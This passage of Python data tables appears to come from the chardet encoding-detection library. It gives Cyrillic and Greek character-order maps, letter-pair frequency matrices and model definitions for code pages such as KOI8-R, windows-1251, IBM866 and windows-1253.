253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,
155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,
253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,
67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,
37, 44, 33, 46, 41, 48, 56, 51, 42, 60, 36, 49, 38, 31, 34, 35,
45, 32, 40, 52, 53, 55, 58, 50, 57, 63, 70, 62, 61, 47, 59, 43,
191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,
207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,
223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,
239,240,241,242,243,244,245,246,247,248,249,250,251,252, 68, 16,
3, 21, 10, 19, 13,  2, 24, 20,  4, 23, 11,  8, 12,  5,  1, 15,
9,  7,  6, 14, 39, 26, 28, 22, 25, 29, 54, 18, 17, 30, 27,255,
)
IBM855_CharToOrderMap = (
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,
253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,
155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,
253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,
67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,
191,192,193,194, 68,195,196,197,198,199,200,201,202,203,204,205,
206,207,208,209,210,211,212,213,214,215,216,217, 27, 59, 54, 70,
3, 37, 21, 44, 28, 58, 13, 41,  2, 48, 39, 53, 19, 46,218,219,
220,221,222,223,224, 26, 55,  4, 42,225,226,227,228, 23, 60,229,
230,231,232,233,234,235, 11, 36,236,237,238,239,240,241,242,243,
8, 49, 12, 38,  5, 31,  1, 34, 15,244,245,246,247, 35, 16,248,
43,  9, 45,  7, 32,  6, 40, 14, 52, 24, 56, 10, 33, 17, 61,249,
250, 18, 62, 20, 51, 25, 57, 30, 47, 29, 63, 22, 50,251,252,255,
)
IBM866_CharToOrderMap = (
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,
253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,
155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,
253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,
67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,
37, 44, 33, 46, 41, 48, 56, 51, 42, 60, 36, 49, 38, 31, 34, 35,
45, 32, 40, 52, 53, 55, 58, 50, 57, 63, 70, 62, 61, 47, 59, 43,
3, 21, 10, 19, 13,  2, 24, 20,  4, 23, 11,  8, 12,  5,  1, 15,
191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,
207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,
223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,
9,  7,  6, 14, 39, 26, 28, 22, 25, 29, 54, 18, 17, 30, 27, 16,
239, 68,240,241,242,243,244,245,246,247,248,249,250,251,252,255,
)
RussianLangModel = (
0,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,1,3,3,3,3,1,3,3,3,2,3,2,3,3,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,0,3,2,2,2,2,2,0,0,2,
3,3,3,2,3,3,3,3,3,3,3,3,3,3,2,3,3,0,0,3,3,3,3,3,3,3,3,3,2,3,2,0,
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,2,2,3,3,3,3,3,3,3,3,3,2,3,3,0,0,3,3,3,3,3,3,3,3,2,3,3,1,0,
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,2,3,2,3,3,3,3,3,3,3,3,3,3,3,3,3,0,0,3,3,3,3,3,3,3,3,3,3,3,2,1,
0,0,0,0,0,0,0,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,0,0,3,3,3,3,3,3,3,3,3,3,3,2,1,
0,0,0,0,0,1,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,3,2,2,2,3,1,3,3,1,3,3,3,3,2,2,3,0,2,2,2,3,3,2,1,0,
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,2,3,3,3,3,3,2,2,3,2,3,3,3,2,1,2,2,0,1,2,2,2,2,2,2,0,
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,2,3,0,2,2,3,3,2,1,2,0,
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,2,3,3,1,2,3,2,2,3,2,3,3,3,3,2,2,3,0,3,2,2,3,1,1,1,0,
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,3,2,2,3,3,3,3,3,2,3,3,3,3,2,2,2,0,3,3,3,2,2,2,2,0,
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,3,3,3,2,3,2,3,3,3,3,3,3,2,3,2,2,0,1,3,2,1,2,2,1,0,
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,3,3,3,3,2,1,1,3,0,1,1,1,1,2,1,1,0,2,2,2,1,2,0,1,0,
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,2,3,3,2,2,2,2,1,3,2,3,2,3,2,1,2,2,0,1,1,2,1,2,1,2,0,
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,3,3,3,3,3,2,2,3,2,3,3,3,2,2,2,2,0,2,2,2,2,3,1,1,0,
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,
3,2,3,2,2,3,3,3,3,3,3,3,3,3,1,3,2,0,0,3,3,3,3,2,3,3,3,3,2,3,2,0,
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,3,3,3,3,3,2,2,3,3,0,2,1,0,3,2,3,2,3,0,0,1,2,0,0,1,0,1,2,1,1,0,
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,0,3,0,2,3,3,3,3,2,3,3,3,3,1,2,2,0,0,2,3,2,2,2,3,2,3,2,2,3,0,0,
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,2,3,0,2,3,2,3,0,1,2,3,3,2,0,2,3,0,0,2,3,2,2,0,1,3,1,3,2,2,1,0,
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,1,3,0,2,3,3,3,3,3,3,3,3,2,1,3,2,0,0,2,2,3,3,3,2,3,3,0,2,2,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,2,2,3,3,2,2,2,3,3,0,0,1,1,1,1,1,2,0,0,1,1,1,1,0,1,0,
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,2,2,3,3,3,3,3,3,3,0,3,2,3,3,2,3,2,0,2,1,0,1,1,0,1,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,2,3,3,3,2,2,2,2,3,1,3,2,3,1,1,2,1,0,2,2,2,2,1,3,1,0,
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,
2,2,3,3,3,3,3,1,2,2,1,3,1,0,3,0,0,3,0,0,0,1,1,0,1,2,1,0,0,0,0,0,
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,2,2,1,1,3,3,3,2,2,1,2,2,3,1,1,2,0,0,2,2,1,3,0,0,2,1,1,2,1,1,0,
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,2,3,3,3,3,1,2,2,2,1,2,1,3,3,1,1,2,1,2,1,2,2,0,2,0,0,1,1,0,1,0,
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,3,3,3,3,3,2,1,3,2,2,3,2,0,3,2,0,3,0,1,0,1,1,0,0,1,1,1,1,0,1,0,
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,2,3,3,3,2,2,2,3,3,1,2,1,2,1,0,1,0,1,1,0,1,0,0,2,1,1,1,0,1,0,
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,
3,1,1,2,1,2,3,3,2,2,1,2,2,3,0,2,1,0,0,2,2,3,2,1,2,2,2,2,2,3,1,0,
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,1,1,0,1,1,2,2,1,1,3,0,0,1,3,1,1,1,0,0,0,1,0,1,1,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,1,3,3,3,2,0,0,0,2,1,0,1,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,0,1,0,0,2,3,2,2,2,1,2,2,2,1,2,1,0,0,1,1,1,0,2,0,1,1,1,0,0,1,1,
1,0,0,0,0,0,1,2,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,
2,3,3,3,3,0,0,0,0,1,0,0,0,0,3,0,1,2,1,0,0,0,0,0,0,0,1,1,0,0,1,1,
1,0,1,0,1,2,0,0,1,1,2,1,0,1,1,1,1,0,1,1,1,1,0,1,0,0,1,0,0,1,1,0,
2,2,3,2,2,2,3,1,2,2,2,2,2,2,2,2,1,1,1,1,1,1,1,0,1,0,1,1,1,0,2,1,
1,1,1,1,1,1,1,1,2,1,1,1,1,1,1,1,1,1,1,0,1,0,1,1,0,1,1,1,0,1,1,0,
3,3,3,2,2,2,2,3,2,2,1,1,2,2,2,2,1,1,3,1,2,1,2,0,0,1,1,0,1,0,2,1,
1,1,1,1,1,2,1,0,1,1,1,1,0,1,0,0,1,1,0,0,1,0,1,0,0,1,0,0,0,1,1,0,
2,0,0,1,0,3,2,2,2,2,1,2,1,2,1,2,0,0,0,2,1,2,2,1,1,2,2,0,1,1,0,2,
1,1,1,1,1,0,1,1,1,2,1,1,1,2,1,0,1,2,1,1,1,1,0,1,1,1,0,0,1,0,0,1,
1,3,2,2,2,1,1,1,2,3,0,0,0,0,2,0,2,2,1,0,0,0,0,0,0,1,0,0,0,0,1,1,
1,0,1,1,0,1,0,1,1,0,1,1,0,2,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,1,1,0,
2,3,2,3,2,1,2,2,2,2,1,0,0,0,2,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,2,1,
1,1,2,1,0,2,0,0,1,0,1,0,0,1,0,0,1,1,0,1,1,0,0,0,0,0,1,0,0,0,0,0,
3,0,0,1,0,2,2,2,3,2,2,2,2,2,2,2,0,0,0,2,1,2,1,1,1,2,2,0,0,0,1,2,
1,1,1,1,1,0,1,2,1,1,1,1,1,1,1,0,1,1,1,1,1,1,0,1,1,1,1,1,1,0,0,1,
2,3,2,3,3,2,0,1,1,1,0,0,1,0,2,0,1,1,3,1,0,0,0,0,0,0,0,1,0,0,2,1,
1,1,1,1,1,1,1,0,1,0,1,1,1,1,0,1,1,1,0,0,1,1,0,1,0,0,0,0,0,0,1,0,
2,3,3,3,3,1,2,2,2,2,0,1,1,0,2,1,1,1,2,1,0,1,1,0,0,1,0,1,0,0,2,0,
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,3,3,3,2,0,0,1,1,2,2,1,0,0,2,0,1,1,3,0,0,1,0,0,0,0,0,1,0,1,2,1,
1,1,2,0,1,1,1,0,1,0,1,1,0,1,0,1,1,1,1,0,1,0,0,0,0,0,0,1,0,1,1,0,
1,3,2,3,2,1,0,0,2,2,2,0,1,0,2,0,1,1,1,0,1,0,0,0,3,0,1,1,0,0,2,1,
1,1,1,0,1,1,0,0,0,0,1,1,0,1,0,0,2,1,1,0,1,0,0,0,1,0,1,0,0,1,1,0,
3,1,2,1,1,2,2,2,2,2,2,1,2,2,1,1,0,0,0,2,2,2,0,0,0,1,2,1,0,1,0,1,
2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,2,1,1,1,0,1,0,1,1,0,1,1,1,0,0,1,
3,0,0,0,0,2,0,1,1,1,1,1,1,1,0,1,0,0,0,1,1,1,0,1,0,1,1,0,0,1,0,1,
1,1,0,0,1,0,0,0,1,0,1,1,0,0,1,0,1,0,1,0,0,0,0,1,0,0,0,1,0,0,0,1,
1,3,3,2,2,0,0,0,2,2,0,0,0,1,2,0,1,1,2,0,0,0,0,0,0,0,0,1,0,0,2,1,
0,1,1,0,0,1,1,0,0,0,1,1,0,1,1,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,1,0,
2,3,2,3,2,0,0,0,0,1,1,0,0,0,2,0,2,0,2,0,0,0,0,0,1,0,0,1,0,0,1,1,
1,1,2,0,1,2,1,0,1,1,2,1,1,1,1,1,2,1,1,0,1,0,0,1,1,1,1,1,0,1,1,0,
1,3,2,2,2,1,0,0,2,2,1,0,1,2,2,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,1,1,
0,0,1,1,0,1,1,0,0,1,1,0,1,1,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,
1,0,0,1,0,2,3,1,2,2,2,2,2,2,1,1,0,0,0,1,0,1,0,2,1,1,1,0,0,0,0,1,
1,1,0,1,1,0,1,1,1,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,
2,0,2,0,0,1,0,3,2,1,2,1,2,2,0,1,0,0,0,2,1,0,0,2,1,1,1,1,0,2,0,2,
2,1,1,1,1,1,1,1,1,1,1,1,1,2,1,0,1,1,1,1,0,0,0,1,1,1,1,0,1,0,0,1,
1,2,2,2,2,1,0,0,1,0,0,0,0,0,2,0,1,1,1,1,0,0,0,0,1,0,1,2,0,0,2,0,
1,0,1,1,1,2,1,0,1,0,1,1,0,0,1,0,1,1,1,0,1,0,0,0,1,0,0,1,0,1,1,0,
2,1,2,2,2,0,3,0,1,1,0,0,0,0,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,
0,0,0,1,1,1,0,0,1,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,
1,2,2,3,2,2,0,0,1,1,2,0,1,2,1,0,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,1,
0,1,1,0,0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0,1,0,0,0,0,0,0,0,0,1,1,0,
2,2,1,1,2,1,2,2,2,2,2,1,2,2,0,1,0,0,0,1,2,2,2,1,2,1,1,1,1,1,2,1,
1,1,1,1,1,1,1,1,1,1,0,0,1,1,1,0,1,1,1,0,0,0,0,1,1,1,0,1,1,0,0,1,
1,2,2,2,2,0,1,0,2,2,0,0,0,0,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,2,0,
0,0,1,0,0,1,0,0,0,0,1,0,1,1,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,
0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,2,2,2,2,0,0,0,2,2,2,0,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,
0,1,1,0,0,1,1,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,2,2,2,2,0,0,0,0,1,0,0,1,1,2,0,0,0,0,1,0,1,0,0,1,0,0,2,0,0,0,1,
0,0,1,0,0,1,0,0,0,1,1,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,
1,2,2,2,1,1,2,0,2,1,1,1,1,0,2,2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,1,
0,0,1,0,1,1,0,0,0,0,1,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,
1,0,2,1,2,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,
0,0,1,0,1,1,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,
1,0,0,0,0,2,0,1,2,1,0,1,1,1,0,1,0,0,0,1,0,1,0,0,1,0,1,0,0,0,0,1,
0,0,0,0,0,1,0,0,1,1,0,0,1,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,
2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,
1,0,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,1,0,0,0,0,0,
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,
1,1,1,0,1,0,1,0,0,1,1,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,0,1,0,0,0,0,
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,
1,1,0,1,1,0,1,0,1,0,0,0,0,1,1,0,1,1,0,0,0,0,0,1,0,1,1,0,1,0,0,0,
0,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,
)
Koi8rModel = {
'charToOrderMap': KOI8R_CharToOrderMap,
'precedenceMatrix': RussianLangModel,
'mTypicalPositiveRatio': 0.976601,
'keepEnglishLetter': False,
'charsetName': "KOI8-R"
}
Win1251CyrillicModel = {
'charToOrderMap': win1251_CharToOrderMap,
'precedenceMatrix': RussianLangModel,
'mTypicalPositiveRatio': 0.976601,
'keepEnglishLetter': False,
'charsetName': "windows-1251"
}
Latin5CyrillicModel = {
'charToOrderMap': latin5_CharToOrderMap,
'precedenceMatrix': RussianLangModel,
'mTypicalPositiveRatio': 0.976601,
'keepEnglishLetter': False,
'charsetName': "ISO-8859-5"
}
MacCyrillicModel = {
'charToOrderMap': macCyrillic_CharToOrderMap,
'precedenceMatrix': RussianLangModel,
'mTypicalPositiveRatio': 0.976601,
'keepEnglishLetter': False,
'charsetName': "MacCyrillic"
};
Ibm866Model = {
'charToOrderMap': IBM866_CharToOrderMap,
'precedenceMatrix': RussianLangModel,
'mTypicalPositiveRatio': 0.976601,
'keepEnglishLetter': False,
'charsetName': "IBM866"
}
Ibm855Model = {
'charToOrderMap': IBM855_CharToOrderMap,
'precedenceMatrix': RussianLangModel,
'mTypicalPositiveRatio': 0.976601,
'keepEnglishLetter': False,
'charsetName': "IBM855"
}
from . import constants
Latin7_CharToOrderMap = (
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,
253, 82,100,104, 94, 98,101,116,102,111,187,117, 92, 88,113, 85,
79,118,105, 83, 67,114,119, 95, 99,109,188,253,253,253,253,253,
253, 72, 70, 80, 81, 60, 96, 93, 89, 68,120, 97, 77, 86, 69, 55,
78,115, 65, 66, 58, 76,106,103, 87,107,112,253,253,253,253,253,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,233, 90,253,253,253,253,253,253,253,253,253,253, 74,253,253,
253,253,253,253,247,248, 61, 36, 46, 71, 73,253, 54,253,108,123,
110, 31, 51, 43, 41, 34, 91, 40, 52, 47, 44, 53, 38, 49, 59, 39,
35, 48,250, 37, 33, 45, 56, 50, 84, 57,120,121, 17, 18, 22, 15,
124,  1, 29, 20, 21,  3, 32, 13, 25,  5, 11, 16, 10,  6, 30,  4,
9,  8, 14,  7,  2, 12, 28, 23, 42, 24, 64, 75, 19, 26, 27,253,
)
win1253_CharToOrderMap = (
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,
253, 82,100,104, 94, 98,101,116,102,111,187,117, 92, 88,113, 85,
79,118,105, 83, 67,114,119, 95, 99,109,188,253,253,253,253,253,
253, 72, 70, 80, 81, 60, 96, 93, 89, 68,120, 97, 77, 86, 69, 55,
78,115, 65, 66, 58, 76,106,103, 87,107,112,253,253,253,253,253,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,233, 61,253,253,253,253,253,253,253,253,253,253, 74,253,253,
253,253,253,253,247,253,253, 36, 46, 71, 73,253, 54,253,108,123,
110, 31, 51, 43, 41, 34, 91, 40, 52, 47, 44, 53, 38, 49, 59, 39,
35, 48,250, 37, 33, 45, 56, 50, 84, 57,120,121, 17, 18, 22, 15,
124,  1, 29, 20, 21,  3, 32, 13, 25,  5, 11, 16, 10,  6, 30,  4,
9,  8, 14,  7,  2, 12, 28, 23, 42, 24, 64, 75, 19, 26, 27,253,
)
GreekLangModel = (
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,3,2,2,3,3,3,3,3,3,3,3,1,3,3,3,0,2,2,3,3,0,3,0,3,2,0,3,3,3,0,
3,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,3,3,3,3,0,3,3,0,3,2,3,3,0,3,2,3,3,3,0,0,3,0,3,0,3,3,2,0,0,0,
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,
0,2,3,2,2,3,3,3,3,3,3,3,3,0,3,3,3,3,0,2,3,3,0,3,3,3,3,2,3,3,3,0,
2,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,2,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,0,2,1,3,3,3,3,2,3,3,2,3,3,2,0,
0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,3,3,3,0,3,3,3,3,3,3,0,3,3,0,3,3,3,3,3,3,3,3,3,3,0,3,2,3,3,0,
2,0,1,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,
0,3,3,3,3,3,2,3,0,0,0,0,3,3,0,3,1,3,3,3,0,3,3,0,3,3,3,3,0,0,0,0,
2,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,3,3,3,3,0,3,0,3,3,3,3,3,0,3,2,2,2,3,0,2,3,3,3,3,3,2,3,3,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,3,3,3,3,3,2,2,2,3,3,3,3,0,3,1,3,3,3,3,2,3,3,3,3,3,3,3,2,2,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,3,3,3,3,2,0,3,0,0,0,3,3,2,3,3,3,3,3,0,0,3,2,3,0,2,3,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,0,3,3,3,3,0,0,3,3,0,2,3,0,3,0,3,3,3,0,0,3,0,3,0,2,2,3,3,0,0,
0,0,1,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,3,3,3,3,2,0,3,2,3,3,3,3,0,3,3,3,3,3,0,3,3,2,3,2,3,3,2,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,3,2,3,2,3,3,3,3,3,3,0,2,3,2,3,2,2,2,3,2,3,3,2,3,0,2,2,2,3,0,
2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,3,0,0,0,3,3,3,2,3,3,0,0,3,0,3,0,0,0,3,2,0,3,0,3,0,0,2,0,2,0,
0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,3,3,3,0,3,3,3,3,3,3,0,3,3,0,3,0,0,0,3,3,0,3,3,3,0,0,1,2,3,0,
3,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,3,3,3,3,2,0,0,3,2,2,3,3,0,3,3,3,3,3,2,1,3,0,3,2,3,3,2,1,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,3,3,0,2,3,3,3,3,3,3,0,0,3,0,3,0,0,0,3,3,0,3,2,3,0,0,3,3,3,0,
3,0,0,0,2,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,3,3,3,0,3,3,3,3,3,3,0,0,3,0,3,0,0,0,3,2,0,3,2,3,0,0,3,2,3,0,
2,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,3,1,2,2,3,3,3,3,3,3,0,2,3,0,3,0,0,0,3,3,0,3,0,2,0,0,2,3,1,0,
2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,0,3,3,3,3,0,3,0,3,3,2,3,0,3,3,3,3,3,3,0,3,3,3,0,2,3,0,0,3,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,0,3,3,3,0,0,3,0,0,0,3,3,0,3,0,2,3,3,0,0,3,0,3,0,3,3,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,3,0,0,0,3,3,3,3,3,3,0,0,3,0,2,0,0,0,3,3,0,3,0,3,0,0,2,0,2,0,
0,0,0,0,1,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
